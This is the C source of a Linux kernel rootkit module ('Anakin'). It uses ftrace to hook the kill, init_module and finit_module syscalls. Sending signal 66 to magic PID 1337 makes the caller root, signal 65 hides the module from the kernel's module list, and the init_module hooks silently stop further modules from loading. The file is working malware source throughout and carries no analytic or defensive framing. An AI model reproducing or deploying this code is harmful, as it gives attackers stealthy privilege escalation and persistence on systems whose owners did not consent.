#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/list.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hoWo");
MODULE_DESCRIPTION("Simple sys_kill and sys hook using ftrace");

// MACROS
#define GET_ROOT_SIG 66
#define TOGGLE_RK_VIEW 65

#define MAGIC_PID 1337

// PROTOTYPES
void getRoot(void);
void toggleRkView(void);

// HOOKS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    long sig = regs->si;
    long pid = regs->di;

    if (pid == MAGIC_PID) {
        switch (sig) {
            case GET_ROOT_SIG:
                getRoot();
                return 0;

            case TOGGLE_RK_VIEW:
                toggleRkView();
                return 0;

        }
    }

    return orig_kill(regs);

}

static asmlinkage long (*orig_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*orig_finit_module)(struct file *file, const char *uargs, unsigned long flags);

static asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;

}

static asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;

}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &orig_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &orig_finit_module),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),

};

static int __init AnakinInit(void) {
    printk(KERN_INFO "Anakin is here\n");
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;

    }

    return 0;

}

static void __exit AnakinExit(void) {
    printk(KERN_INFO "Anakin killed padmé\n");
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

}

module_init(AnakinInit);
module_exit(AnakinExit);

void getRoot(void) {
    struct cred *creds;
    creds = prepare_creds();
    if (creds == NULL) {
        return;

    }

    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    commit_creds(creds);

}

static struct list_head *prev_module;
static short hidden = 0;
void toggleRkView(void) {
    if (hidden == 1) {
        list_add(&THIS_MODULE->list, prev_module);
        hidden = 0;

    } else {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;

    }
}